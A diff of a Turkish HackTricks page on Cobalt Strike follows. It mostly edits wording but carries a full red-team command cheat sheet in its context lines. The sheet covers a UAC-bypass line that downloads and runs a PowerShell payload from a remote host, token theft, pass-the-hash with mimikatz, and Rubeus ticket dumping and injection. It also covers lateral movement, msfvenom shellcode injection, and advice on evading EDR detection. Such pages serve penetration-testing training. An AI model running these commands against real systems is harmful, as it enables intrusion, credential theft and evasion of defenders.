@@ -1,6 +1,6 @@
 # Cobalt Strike
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
 
 ### Dinleyiciler
 
@@ -15,7 +15,7 @@ Bu dinleyicilerin beacon'ları doğrudan C2 ile konuşmak zorunda değildir, di�
 `Cobalt Strike -> Dinleyiciler -> Ekle/Düzenle` ardından TCP veya SMB beacon'larını seçmeniz gerekir.
 
 * **TCP beacon, seçilen portta bir dinleyici ayarlayacaktır**. TCP beacon'a bağlanmak için başka bir beacon'dan `connect <ip> <port>` komutunu kullanın.
-* **smb beacon, seçilen isimle bir pipename üzerinde dinleyecektir**. SMB beacon'a bağlanmak için `link [target] [pipe]` komutunu kullanmanız gerekir.
+* **smb beacon, seçilen isimle bir pipename'de dinleyecektir**. SMB beacon'a bağlanmak için `link [target] [pipe]` komutunu kullanmanız gerekir.
 
 ### Yükleri Oluşturma ve Barındırma
 
@@ -25,8 +25,8 @@ Bu dinleyicilerin beacon'ları doğrudan C2 ile konuşmak zorunda değildir, di�
 
 * **`HTMLApplication`** HTA dosyaları için
 * **`MS Office Macro`** makro içeren bir ofis belgesi için
-* **`Windows Executable`** .exe, .dll veya hizmet .exe için
-* **`Windows Executable (S)`** **stageless** .exe, .dll veya hizmet .exe için (stageless, staged'den daha iyidir, daha az IoC)
+* **`Windows Executable`** bir .exe, .dll veya hizmet .exe için
+* **`Windows Executable (S)`** **stageless** bir .exe, .dll veya hizmet .exe için (stageless, staged'den daha iyidir, daha az IoC)
 
 #### Yükleri Oluşturma ve Barındırma
 
@@ -34,7 +34,7 @@ Bu dinleyicilerin beacon'ları doğrudan C2 ile konuşmak zorunda değildir, di�
 
 #### Yükleri Barındırma
 
-Barındırmak istediğiniz dosyaya sahip iseniz, `Saldırılar -> Web Drive-by -> Dosyayı Barındır` seçeneğine gidin ve barındırmak için dosyayı ve web sunucu yapılandırmasını seçin.
+Barındırmak istediğiniz dosyaya sahip iseniz, `Saldırılar -> Web Drive-by -> Dosyayı Barındır` seçeneğine gidin ve barındırılacak dosyayı ve web sunucu yapılandırmasını seçin.
 
 ### Beacon Seçenekleri
 
@@ -77,7 +77,7 @@ elevate svc-exe <listener>
 elevate uac-token-duplication <listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
-## PID'den token çalma
+## PID'den token çal
 ## make_token gibi ama bir süreçten token çalıyor
 steal_token [pid] # Ayrıca, bu ağ eylemleri için yararlıdır, yerel eylemler için değil
 ## API belgelerinden, bu oturum açma türünün "çağrıcının mevcut token'ını klonlamasına izin verdiğini" biliyoruz. Bu nedenle Beacon çıktısı, Taklit Edilen <current_username> diyor - kendi klonlanmış token'ımızı taklit ediyor.
@@ -86,7 +86,7 @@ rev2self # steal_token'dan token kullanmayı durdur
 
 ## Yeni kimlik bilgileri ile süreci başlat
 spawnas [domain\username] [password] [listener] # Okuma erişimi olan bir dizinden yapın: cd C:\
-## make_token gibi, bu Windows olayı 4624'ü oluşturacaktır: Bir hesap başarıyla oturum açtı ama 2 (LOGON32_LOGON_INTERACTIVE) oturum açma türü ile. Çağrılan kullanıcıyı (TargetUserName) ve taklit edilen kullanıcıyı (TargetOutboundUserName) detaylandıracaktır.
+## make_token gibi, bu Windows olayı 4624'ü oluşturacaktır: Bir hesap başarıyla oturum açtı ama 2 (LOGON32_LOGON_INTERACTIVE) oturum açma türü ile. Çağrıcı kullanıcıyı (TargetUserName) ve taklit edilen kullanıcıyı (TargetOutboundUserName) detaylandıracaktır.
 
 ## Sürece enjekte et
 inject [pid] [x64|x86] [listener]
@@ -99,7 +99,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Mimikatz ile hash'i geç
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## /run olmadan, mimikatz bir cmd.exe başlatır, eğer bir masaüstü olan bir kullanıcı olarak çalışıyorsanız, shell'i görecektir (eğer SYSTEM olarak çalışıyorsanız, iyi gidiyorsunuz)
+## /run olmadan, mimikatz bir cmd.exe başlatır, eğer bir masaüstü kullanıcısı olarak çalışıyorsanız, shell'i görecektir (eğer SYSTEM olarak çalışıyorsanız, iyi gidiyorsunuz)
 steal_token <pid> # Mimikatz tarafından oluşturulan süreçten token çal
 
 ## Bilet geçişi
@@ -108,7 +108,7 @@ execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Yeni bilet ile kullanılacak yeni bir oturum açma oturumu oluştur (ele geçirilen birini üzerine yazmamak için)
 make_token <domain>\<username> DummyPass
-## Bileti saldırgan makinesine bir powershell oturumu üzerinden yazın ve yükleyin
+## Bileti saldırgan makinesine bir powershell oturumundan yazın ve yükleyin
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -121,25 +121,25 @@ steal_token <pid>
 ## Bileti çıkar + Bileti geç
 ### Biletleri listele
 execute-assembly C:\path\Rubeus.exe triage
-### LUID ile ilginç bileti dök
+### LUID ile ilginç bir bileti dök
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
-### Yeni bir oturum açma oturumu oluştur, LUID ve processid'yi not edin
+### Yeni bir oturum açma oturumu oluştur, LUID ve processid'yi not et
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 ### Bileti oluşturulan oturum açma oturumuna ekle
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
 ### Son olarak, o yeni süreçten token çal
 steal_token <pid>
 
-# Yanal Hareket
+# Lateral Hareket
 ## Bir token oluşturulduysa kullanılacaktır
 jump [method] [target] [listener]
 ## Yöntemler:
-## psexec                    x86   Bir hizmeti çalıştırmak için bir Hizmet EXE nesnesi kullan
-## psexec64                  x64   Bir hizmeti çalıştırmak için bir Hizmet EXE nesnesi kullan
+## psexec                    x86   Bir hizmeti çalıştırmak için bir Service EXE nesnesi kullan
+## psexec64                  x64   Bir hizmeti çalıştırmak için bir Service EXE nesnesi kullan
 ## psexec_psh                x86   Bir hizmeti çalıştırmak için bir PowerShell one-liner kullan
 ## winrm                     x86   WinRM üzerinden bir PowerShell scripti çalıştır
 ## winrm64                   x64   WinRM üzerinden bir PowerShell scripti çalıştır
-## wmi_msbuild               x64   msbuild inline c# görevi ile wmi yanal hareket (opsec)
+## wmi_msbuild               x64   msbuild inline c# görevi ile wmi lateral hareket (opsec)
 
 remote-exec [method] [target] [command] # remote-exec çıktı döndürmez
 ## Yöntemler:
@@ -163,7 +163,7 @@ msf6 exploit(multi/handler) > exploit -j
 beacon> spawn metasploit
 ## Yalnızca yabancı dinleyici ile x86 Meterpreter oturumları başlatabilirsiniz.
 
-# Metasploit oturumunu Cobalt Strike'a geçirme - Shellcode enjekte etme yoluyla
+# Metasploit oturumunu Cobalt Strike'a geçirin - Shellcode enjekte ederek
 ## Metasploit ana bilgisayarında
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## msfvenom'u çalıştırın ve multi/handler dinleyicisini hazırlayın
@@ -172,7 +172,7 @@ msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw 
 ps
 shinject <pid> x64 C:\Payloads\msf.bin # x64 bir süreçte metasploit shellcode enjekte et
 
-# Metasploit oturumunu Cobalt Strike'a geçirme
+# Metasploit oturumunu Cobalt Strike'a geçirin
 ## Stageless Beacon shellcode oluşturun, Saldırılar > Paketler > Windows Executable (S) bölümüne gidin, istenen dinleyiciyi seçin, Çıktı türü olarak Raw'ı seçin ve x64 yükünü kullanın.
 ## Oluşturulan cobalt strike shellcode'u enjekte etmek için metasploit'te post/windows/manage/shellcode_inject kullanın.
 
@@ -187,14 +187,14 @@ beacon> ssh 10.10.17.12:22 kullanıcı adı şifre</code></pre>
 
 ### Execute-Assembly
 
-**`execute-assembly`**, belirtilen programı çalıştırmak için uzaktan süreç enjekte etme kullanarak bir **kurban süreci** kullanır. Bu, bir süreç içine enjekte etmek için belirli Win API'lerinin kullanılması nedeniyle çok gürültülüdür ve her EDR bunu kontrol etmektedir. Ancak, aynı süreçte bir şey yüklemek için kullanılabilecek bazı özel araçlar vardır:
+**`execute-assembly`**, belirtilen programı çalıştırmak için uzaktan süreç enjekte etme kullanarak bir **kurban süreci** kullanır. Bu, bir süreç içine enjekte etmek için kullanılan belirli Win API'leri nedeniyle çok gürültülüdür ve her EDR bunu kontrol etmektedir. Ancak, aynı süreçte bir şey yüklemek için kullanılabilecek bazı özel araçlar vardır:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 - Cobalt Strike'da BOF (Beacon Object Files) kullanabilirsiniz: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 
-Agressor script `https://github.com/outflanknl/HelpColor`, Cobalt Strike'da `helpx` komutunu oluşturacak ve bu komutlar BOF'lar (yeşil), Frok&Run (sarı) ve benzeri olup olmadığını belirten renkler koyacaktır veya Süreç Yürütme, enjekte etme veya benzeri (kırmızı) olup olmadığını gösterecektir. Bu, hangi komutların daha gizli olduğunu bilmeye yardımcı olur.
+Agressor script `https://github.com/outflanknl/HelpColor`, Cobalt Strike'da `helpx` komutunu oluşturacak ve bu komutlar BOF'lar (yeşil), Frok&Run (sarı) ve benzeri olup olmadığını veya Süreç Yürütme, enjekte etme veya benzeri olup olmadığını belirten renkler koyacaktır. Bu, hangi komutların daha gizli olduğunu bilmeye yardımcı olur.
 
 ### Kullanıcı olarak hareket et
 
@@ -203,23 +203,23 @@ Agressor script `https://github.com/outflanknl/HelpColor`, Cobalt Strike'da `hel
 - Güvenlik EID 4624 - Alışılmış çalışma saatlerini bilmek için tüm etkileşimli oturum açmaları kontrol edin.
 - Sistem EID 12,13 - Kapatma/açma/uyku sıklığını kontrol edin.
 - Güvenlik EID 4624/4625 - Geçerli/geçersiz NTLM denemelerini kontrol edin.
-- Güvenlik EID 4648 - Bu olay, düz metin kimlik bilgileri kullanılarak oturum açıldığında oluşturulur. Eğer bir süreç bunu oluşturduysa, ikili dosya muhtemelen bir yapılandırma dosyasında veya kod içinde düz metin kimlik bilgilerini içermektedir.
+- Güvenlik EID 4648 - Bu olay, düz metin kimlik bilgileri kullanılarak oturum açıldığında oluşturulur. Eğer bir süreç bunu oluşturduysa, ikili dosya muhtemelen bir yapılandırma dosyasında veya kod içinde düz metin olarak kimlik bilgilerini içermektedir.
 
 Cobalt Strike'dan `jump` kullanırken, yeni sürecin daha meşru görünmesi için `wmi_msbuild` yöntemini kullanmak daha iyidir.
 
 ### Bilgisayar hesaplarını kullanın
 
-Savunucuların kullanıcılar tarafından üretilen garip davranışları kontrol etmesi yaygındır ve **hizmet hesaplarını ve bilgisayar hesaplarını izlemelerinden hariç tutarlar**. Bu hesapları yanal hareket veya ayrıcalık yükseltme gerçekleştirmek için kullanabilirsiniz.
+Savunucuların kullanıcılar tarafından üretilen garip davranışları kontrol etmesi yaygındır ve **hizmet hesaplarını ve bilgisayar hesaplarını izlemelerinden hariç tutarlar**. Bu hesapları lateral hareket veya ayrıcalık yükseltme yapmak için kullanabilirsiniz.
 
 ### Stageless yükleri kullanın
 
-Stageless yükler, ikinci bir aşamayı C2 sunucusundan indirmeleri gerekmediği için staged olanlardan daha az gürültülüdür. Bu, ilk bağlantıdan sonra herhangi bir ağ trafiği oluşturmadıkları anlamına gelir ve bu da ağ tabanlı savunmalar tarafından tespit edilme olasılıklarını azaltır.
+Stageless yükler, ikinci bir aşamayı C2 sunucusundan indirmeleri gerekmediği için staged olanlardan daha az gürültülüdür. Bu, ilk bağlantıdan sonra herhangi bir ağ trafiği oluşturmadıkları anlamına gelir, bu da ağ tabanlı savunmalar tarafından tespit edilme olasılıklarını azaltır.
 
 ### Token'lar ve Token Deposu
 
-Token çalarken veya oluştururken dikkatli olun çünkü bir EDR'nin tüm thread'lerin token'larını listelemesi ve **farklı bir kullanıcıya veya hatta SYSTEM'a ait bir token bulması mümkün olabilir**.
+Token çalarken veya oluştururken dikkatli olun çünkü bir EDR'nin tüm thread'lerin token'larını listelemesi ve **farklı bir kullanıcıya ait bir token'ı** veya hatta SYSTEM'ı bulması mümkün olabilir.
 
-Bu, token'ları **her beacon için** depolamayı sağlar, böylece aynı token'ı tekrar tekrar çalmaya gerek kalmaz. Bu, yanal hareket veya çalınan bir token'ı birden fazla kez kullanmanız gerektiğinde faydalıdır:
+Bu, token'ları **her beacon için** depolamayı sağlar, böylece aynı token'ı tekrar tekrar çalmaya gerek kalmaz. Bu, lateral hareket veya çalınan bir token'ı birden fazla kez kullanmanız gerektiğinde yararlıdır:
 
 - token-store steal <pid>
 - token-store steal-and-use <pid>
@@ -228,11 +228,11 @@ Bu, token'ları **her beacon için** depolamayı sağlar, böylece aynı token'�
 - token-store remove <id>
 - token-store remove-all
 
-Yanal hareket ederken, genellikle **yeni bir token oluşturmak yerine bir token çalmak daha iyidir** veya hash geçişi saldırısı gerçekleştirmek.
+Lateral hareket ederken, genellikle **yeni bir token oluşturmak yerine bir token çalmak daha iyidir** veya hash geçişi saldırısı gerçekleştirmek.
 
 ### Guardrails
 
-Cobalt Strike, savunucular tarafından tespit edilebilecek belirli komutların veya eylemlerin kullanılmasını önlemeye yardımcı olan **Guardrails** adlı bir özelliğe sahiptir. Guardrails, `make_token`, `jump`, `remote-exec` gibi yanal hareket veya ayrıcalık yükseltme için yaygın olarak kullanılan belirli komutları engellemek üzere yapılandırılabilir.
+Cobalt Strike, savunucular tarafından tespit edilebilecek belirli komutların veya eylemlerin kullanılmasını önlemeye yardımcı olan **Guardrails** adlı bir özelliğe sahiptir. Guardrails, `make_token`, `jump`, `remote-exec` gibi lateral hareket veya ayrıcalık yükseltme için yaygın olarak kullanılan belirli komutları engellemek üzere yapılandırılabilir.
 
 Ayrıca, [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) deposu, bir yükü çalıştırmadan önce göz önünde bulundurabileceğiniz bazı kontroller ve fikirler içermektedir.
 
@@ -251,20 +251,20 @@ Ayrıca, poext exploitation saldırısında `\\.\pipe\postex_####` boruları `se
 Cobalt Strike profillerinde ayrıca şunları değiştirebilirsiniz:
 
 - `rwx` kullanmaktan kaçınmak
-- `process-inject {...}` bloğunda süreç enjekte etme davranışının nasıl çalıştığı (hangi API'lerin kullanılacağı)
+- `process-inject {...}` bloğunda süreç enjekte etme davranışının nasıl çalıştığını (hangi API'lerin kullanılacağı)
 - `post-ex {…}` bloğunda "fork and run"ın nasıl çalıştığı
 - Uyku süresi
 - Belleğe yüklenecek ikililerin maksimum boyutu
-- Bellek ayak izi ve DLL içeriği `stage {...}` bloğunda
+- Bellek ayak izi ve DLL içeriği `stage {...}` bloğuyla
 - Ağ trafiği
 
 ### Bellek taramasını atlatma
 
-Bazı EDR'ler, bazı bilinen kötü amaçlı yazılım imzaları için belleği tarar. Cobalt Strike, arka kapıyı bellekte şifreleyebilecek `sleep_mask` fonksiyonunu BOF olarak değiştirmeyi sağlar.
+Bazı EDR'ler, bazı bilinen kötü amaçlı yazılım imzalarını bellekte tarar. Cobalt Strike, arka kapıyı bellekte şifreleyebilecek `sleep_mask` fonksiyonunu bir BOF olarak değiştirmeyi sağlar.
 
 ### Gürültülü süreç enjekte etme
 
-Bir sürece kod enjekte ederken bu genellikle çok gürültülüdür, çünkü **normal bir süreç genellikle bu eylemi gerçekleştirmez ve bunu yapmanın yolları çok sınırlıdır**. Bu nedenle, davranış tabanlı tespit sistemleri tarafından tespit edilebilir. Ayrıca, EDR'ler, **diskte olmayan kod içeren thread'leri tarayarak da tespit edebilir** (ancak tarayıcılar gibi JIT kullanan süreçler bunu yaygın olarak yapar). Örnek: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+Bir sürece kod enjekte ederken bu genellikle çok gürültülüdür, çünkü **normal bir süreç genellikle bu eylemi gerçekleştirmez ve bunu yapmanın yolları çok sınırlıdır**. Bu nedenle, davranış tabanlı tespit sistemleri tarafından tespit edilebilir. Ayrıca, EDR'ler, **diskte olmayan kod içeren thread'leri tarayarak** bunu tespit edebilir (bununla birlikte, JIT kullanan tarayıcılar gibi süreçler bunu yaygın olarak yapar). Örnek: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PID ve PPID ilişkileri
 
@@ -272,7 +272,7 @@ Yeni bir süreç başlatırken, tespit edilmemek için **normal bir ebeveyn-çoc
 
 Cobalt Strike'da yeni bir beacon başlatıldığında varsayılan olarak **`rundll32.exe`** kullanan bir süreç oluşturulur. Bu çok gizli değildir ve EDR'ler tarafından kolayca tespit edilebilir. Ayrıca, `rundll32.exe` herhangi bir argüman olmadan çalıştırılır, bu da onu daha da şüpheli hale getirir.
 
-Aşağıdaki Cobalt Strike komutuyla, yeni beacon'ı başlatmak için farklı bir süreç belirleyebilir, bu da onu daha az tespit edilebilir hale getirirsiniz:
+Aşağıdaki Cobalt Strike komutuyla, yeni beacon'ı başlatmak için farklı bir süreç belirleyebilir, bu da onu daha az tespit edilebilir hale getirir:
 ```bash
 spawnto x86 svchost.exe
 ```
@@ -360,4 +360,4 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
 
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
